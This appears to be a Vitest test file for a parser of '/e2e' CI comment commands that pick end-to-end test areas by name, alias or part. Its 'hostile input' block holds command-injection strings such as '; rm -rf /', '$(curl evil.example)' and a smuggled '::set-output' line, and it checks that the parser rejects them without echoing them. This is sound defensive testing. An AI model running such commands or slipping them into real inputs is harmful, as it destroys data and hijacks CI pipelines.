import { describe, expect, it } from "vitest";
import { AREAS } from "../../../../../e2e/areas.ts";
import { createAreaSelectors, parseE2eCommand } from "../e2eAreasCommand.ts";
import type { SelectableArea } from "../e2eAreasCommand.ts";

// A fixed list, so the tests don't change when e2e/areas.ts does. `website-builder` has parts.
const TEST_AREAS: SelectableArea[] = [
    { name: "login" },
    { name: "file-manager", aliases: ["fm"] },
    { name: "workflows", aliases: ["wf"] },
    {
        name: "website-builder",
        aliases: ["wb"],
        parts: [{ name: "pages" }, { name: "redirects", aliases: ["redirects"] }]
    }
];

const parse = (body: string) => {
    return parseE2eCommand(body, TEST_AREAS);
};

describe("parseE2eCommand", () => {
    it("runs everything when nothing follows the command", () => {
        expect(parse("/e2e")).toEqual({ ok: true, tags: [], label: "all" });
        expect(parse("/e2e   ")).toEqual({ ok: true, tags: [], label: "all" });
        expect(parse("/e2e \n ")).toEqual({ ok: true, tags: [], label: "all" });
    });

    it("selects one area", () => {
        expect(parse("/e2e workflows")).toEqual({
            ok: true,
            tags: ["workflows"],
            label: "workflows"
        });
    });

    it("selects several areas separated by spaces, commas or both, in the list's order", () => {
        const expected = { ok: true, tags: ["login", "workflows"], label: "login, workflows" };
        expect(parse("/e2e workflows login")).toEqual(expected);
        expect(parse("/e2e workflows,login")).toEqual(expected);
        expect(parse("/e2e workflows, login")).toEqual(expected);
        expect(parse("/e2e  workflows ,, login  ")).toEqual(expected);
    });

    it("ignores case", () => {
        expect(parse("/e2e Workflows,LOGIN")).toMatchObject({ tags: ["login", "workflows"] });
    });

    it("resolves an alias to its area", () => {
        expect(parse("/e2e fm")).toMatchObject({ ok: true, tags: ["file-manager"] });
    });

    it("mixes aliases and names", () => {
        expect(parse("/e2e wf,login fm")).toMatchObject({
            ok: true,
            tags: ["login", "file-manager", "workflows"]
        });
    });

    it("selects an area once when it is named through an alias too", () => {
        expect(parse("/e2e fm,file-manager")).toEqual({
            ok: true,
            tags: ["file-manager"],
            label: "file-manager"
        });
    });

    it("rejects an unknown area and names the valid ones", () => {
        const command = parse("/e2e cms,fm");
        expect(command.ok).toBe(false);
        if (command.ok) {
            return;
        }
        expect(command.message).toContain("Unknown area: `cms`.");
        expect(command.message).not.toContain("`fm`");
        expect(command.message).toContain(
            "Valid names: login, file-manager (fm), workflows (wf), website-builder (wb), " +
                "website-builder-pages (wb-pages), website-builder-redirects (redirects, wb-redirects)."
        );
    });

    describe("parts", () => {
        it("selects a part by its tag", () => {
            expect(parse("/e2e website-builder-redirects")).toEqual({
                ok: true,
                tags: ["website-builder-redirects"],
                label: "website-builder-redirects"
            });
        });

        it("selects a part by the area alias and the part name", () => {
            expect(parse("/e2e wb-pages")).toMatchObject({ tags: ["website-builder-pages"] });
        });

        it("selects a part by an alias of its own", () => {
            expect(parse("/e2e redirects")).toMatchObject({
                tags: ["website-builder-redirects"]
            });
        });

        it("selects every part through the area", () => {
            expect(parse("/e2e wb")).toMatchObject({ tags: ["website-builder"] });
        });

        it("keeps both parts when both are named", () => {
            expect(parse("/e2e wb-redirects wb-pages")).toMatchObject({
                tags: ["website-builder-pages", "website-builder-redirects"]
            });
        });

        it("collapses an area and one of its own parts into the area", () => {
            expect(parse("/e2e wb-pages,website-builder")).toEqual({
                ok: true,
                tags: ["website-builder"],
                label: "website-builder"
            });
        });

        it("rejects a part the area does not have", () => {
            expect(parse("/e2e wb-menus")).toMatchObject({ ok: false });
        });
    });

    describe("hostile input", () => {
        const hostile = [
            "/e2e workflows; rm -rf /",
            "/e2e $(curl evil.example)",
            "/e2e `id`",
            "/e2e workflows\nrm -rf /",
            "/e2e workflows\r\n::set-output name=tags::x",
            "/e2e workflows && echo pwned",
            `/e2e ${"a".repeat(65)}`
        ];

        it.each(hostile)("rejects %j without echoing it", body => {
            const command = parse(body);
            expect(command.ok).toBe(false);
            if (command.ok) {
                return;
            }
            // Only names that match the strict pattern are ever shown back.
            for (const fragment of [";", "$(", "`id`", "\n", "\r", "::", "&&", "a".repeat(65)]) {
                expect(command.message).not.toContain(fragment);
            }
        });

        it("rejects a comment that is not the command", () => {
            expect(parse("/e2eworkflows")).toMatchObject({ ok: false });
            expect(parse(" /e2e workflows")).toMatchObject({ ok: false });
            expect(parse("please /e2e")).toMatchObject({ ok: false });
        });
    });
});

describe("createAreaSelectors", () => {
    it("accepts the real area list", () => {
        expect(() => createAreaSelectors(AREAS)).not.toThrow();
    });

    it("refuses an alias that is another area's name", () => {
        expect(() => {
            createAreaSelectors([{ name: "login" }, { name: "workflows", aliases: ["login"] }]);
        }).toThrow('"login" selects both login and workflows.');
    });

    it("refuses an alias-and-part name that is taken", () => {
        expect(() => {
            createAreaSelectors([
                { name: "wb-pages" },
                { name: "website-builder", aliases: ["wb"], parts: [{ name: "pages" }] }
            ]);
        }).toThrow('"wb-pages" selects both wb-pages and website-builder-pages.');
    });

    it("refuses a name outside the pattern", () => {
        expect(() => createAreaSelectors([{ name: "Login" }])).toThrow("must match");
    });
});
